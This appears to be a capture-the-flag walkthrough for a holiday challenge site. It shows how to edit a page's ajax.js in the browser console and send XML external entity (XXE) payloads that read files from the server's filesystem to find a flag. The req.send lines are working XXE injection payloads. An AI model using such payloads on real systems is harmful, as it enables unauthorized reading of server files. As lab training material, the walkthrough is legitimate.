  TAMPER (cookies)
  TRAFFIC FLIES
  PATH (elf make paths)
  APP
  SIMPLE FORMAT (way to track rings)
  RINGLIST (file, a list)
  TYPE (of language)

3) Once you get to the last set of images, press F12 to access your browser's Dev Console.

4) Sources (tab) > static (folder) > js (folder) > ajax.js (file) > bottom of this file is what makes the HTTP POST requests.

5) Change content-type to application/xml to start submitting payload/body in xml format. Everything in req.send needs to be on one line. Press Ctrl+S to save your changes:

req.open('POST', '/dropped', true);
req.setRequestHeader("Content-Type", "application/xml");
req.setRequestHeader('Accept', 'application/json');
req.setRequestHeader("X-Grinchum", reqToken);
req.send('<root><imgDrop>img1</imgDrop><who>princess</who><reqType>xml</reqType></root>');


6) Drop an image anywhere to see responses to your changes within the browser.

7) Add !DOCTYPE and !ENTITY (www.youtube.com/watch?v=gjm6VHZa_8s) and request the RINGLIST:

req.send('<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/ringlist.txt">]><root><imgDrop>&xxe;</imgDrop><who>princess</who><reqType>xml</reqType></root>');


11) Next clue (https://glamtarielsfountain.com/static/images/pholder-morethantopsupersecret63842.png) image shows x_phial_pholder_2022 folder with red and blue ring. Actual game page has a silver ring so:

req.send('<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/silverring.txt">]><root><imgDrop>&xxe;</imgDrop><who>princess</who><reqType>xml</reqType></root>');


12) Next clue (https://glamtarielsfountain.com/static/images/x_phial_pholder_2022/redring-supersupersecret928164.png) image shows a red ring with the phrase goldring_to_be_deleted.txt so:

req.send('<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]><root><imgDrop>&xxe;</imgDrop><who>princess</who><reqType>xml</reqType></root>');


13) New keyword is REQ. Move &xxe; to reqType and put img1 (silver ring) into the imgDrop:

req.send('<?xml version="1.0"?><!DOCTYPE xxe [<!ENTITY xxe SYSTEM "file:///app/static/images/x_phial_pholder_2022/goldring_to_be_deleted.txt">]><root><imgDrop>img1</imgDrop><who>princess</who><reqType>&xxe;</reqType></root>');


14a) Right click on the gold ring image > Open image in new tab > (the flag is in the address bar)

14b) Dev Console > Network (tab) > (view the last request named "dropped") > (the flag is in the value of "visit" of the response)
